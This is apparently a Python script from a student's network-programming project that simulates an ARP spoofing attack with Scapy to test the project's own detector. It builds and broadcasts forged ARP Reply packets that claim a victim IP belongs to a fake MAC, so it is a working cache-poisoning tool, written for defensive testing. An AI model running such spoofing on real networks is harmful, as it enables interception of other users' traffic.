# =============================================================================
# Name        : ANIQ NAJMUDDIN BIN SHARIFUDDIN
# Matric No   : BI23110059
# Course      : KP35203 - Network Programming
# Assignment  : Individual Project Assignment (20%)
# Project     : ARP Guard - ARP Spoofing Detector & Active Defender
# File        : simulate_attack.py
# Description : ARP Spoofing attack simulator for testing and demonstration.
#               Sends forged ARP Reply packets to trigger the ARP Guard
#               detection engine. Run this WHILE main.py is running to
#               verify the detection and alerting system works correctly.
#
# Usage:
#   python simulate_attack.py --iface "Ethernet"
#   python simulate_attack.py --iface "Ethernet" --target-ip 192.168.1.10
#   python simulate_attack.py --iface "Ethernet" --count 5
#
# WARNING: For educational/testing purposes only. Only run on networks
#          you own or have explicit permission to test.
# =============================================================================

import argparse
import time
from scapy.all import ARP, Ether, sendp
from colorama import Fore, Style, init as colorama_init

colorama_init(autoreset=True)

BANNER = f"""
{Fore.RED}
 ██████╗ ███████╗███╗   ███╗ ██████╗
██╔═══██╗██╔════╝████╗ ████║██╔═══██╗
██║   ██║█████╗  ██╔████╔██║██║   ██║
██║   ██║██╔══╝  ██║╚██╔╝██║██║   ██║
╚██████╔╝███████╗██║ ╚═╝ ██║╚██████╔╝
 ╚═════╝ ╚══════╝╚═╝     ╚═╝ ╚═════╝
{Style.RESET_ALL}
  {Fore.YELLOW}ARP Spoofing Attack Simulator — FOR TESTING ONLY{Style.RESET_ALL}
  {Fore.YELLOW}KP35203 - Network Programming | ANIQ NAJMUDDIN | BI23110059{Style.RESET_ALL}
"""


def send_fake_arp(interface: str, target_ip: str, fake_mac: str, count: int, delay: float):
    """
    Send forged ARP Reply packets claiming a legitimate IP maps to a fake MAC.

    This simulates what a real ARP spoofing attacker does:
    - Broadcasts a fake ARP Reply to the entire LAN
    - Claims that target_ip belongs to fake_mac (attacker's MAC)
    - Victims update their ARP cache with the false mapping
    - ARP Guard should detect this and raise an alert immediately

    Args:
        interface  (str):   Network interface to send on.
        target_ip  (str):   The victim IP to spoof (must be in ARP Guard's trust table).
        fake_mac   (str):   The forged MAC address to claim for the victim IP.
        count      (int):   Number of forged packets to send.
        delay      (float): Seconds between each packet.
    """
    print(f"\n{Fore.RED}[ATTACK]{Style.RESET_ALL} Preparing forged ARP Reply...")
    print(f"  Interface  : {interface}")
    print(f"  Spoofing IP: {target_ip}")
    print(f"  Fake MAC   : {fake_mac}")
    print(f"  Packets    : {count}")
    print(f"  Delay      : {delay}s between packets\n")

    # Build the forged ARP packet
    # Ether dst=broadcast so ALL hosts on the LAN receive and process it
    ether = Ether(dst="ff:ff:ff:ff:ff:ff", src=fake_mac)
    arp   = ARP(
        op=2,                        # ARP Reply (is-at)
        hwsrc=fake_mac,              # Attacker's (fake) MAC
        psrc=target_ip,              # Legitimate IP being hijacked
        hwdst="ff:ff:ff:ff:ff:ff",  # Broadcast
        pdst=target_ip
    )

    packet = ether / arp

    for i in range(1, count + 1):
        sendp(packet, iface=interface, verbose=False)
        print(
            f"{Fore.RED}[ATTACK]{Style.RESET_ALL} "
            f"Sent packet {i}/{count} — claiming {target_ip} = {fake_mac}"
        )
        time.sleep(delay)

    print(f"\n{Fore.YELLOW}[ATTACK]{Style.RESET_ALL} Attack simulation complete.")
    print(f"{Fore.CYAN}[INFO]{Style.RESET_ALL} Check the ARP Guard dashboard for alerts → http://127.0.0.1:5000\n")


def main():
    """
    Entry point for the attack simulator.
    Parses CLI arguments (interface, target IP, fake MAC, packet count, delay)
    and calls send_fake_arp() to transmit forged ARP Reply packets for testing.
    """
    print(BANNER)

    parser = argparse.ArgumentParser(
        description="ARP Guard — Attack Simulator (for testing only)"
    )
    parser.add_argument(
        "--iface", "-i",
        type=str,
        default="Ethernet",
        help="Network interface to send packets on (default: Ethernet)"
    )
    parser.add_argument(
        "--target-ip",
        type=str,
        default="192.168.1.10",
        help="IP address to spoof (default: 192.168.1.10)"
    )
    parser.add_argument(
        "--fake-mac",
        type=str,
        default="aa:bb:cc:dd:ee:ff",
        help="Fake MAC address to claim (default: aa:bb:cc:dd:ee:ff)"
    )
    parser.add_argument(
        "--count", "-c",
        type=int,
        default=3,
        help="Number of forged packets to send (default: 3)"
    )
    parser.add_argument(
        "--delay", "-d",
        type=float,
        default=1.0,
        help="Delay in seconds between packets (default: 1.0)"
    )

    args = parser.parse_args()

    send_fake_arp(
        interface=args.iface,
        target_ip=args.target_ip,
        fake_mac=args.fake_mac,
        count=args.count,
        delay=args.delay
    )


if __name__ == "__main__":
    main()
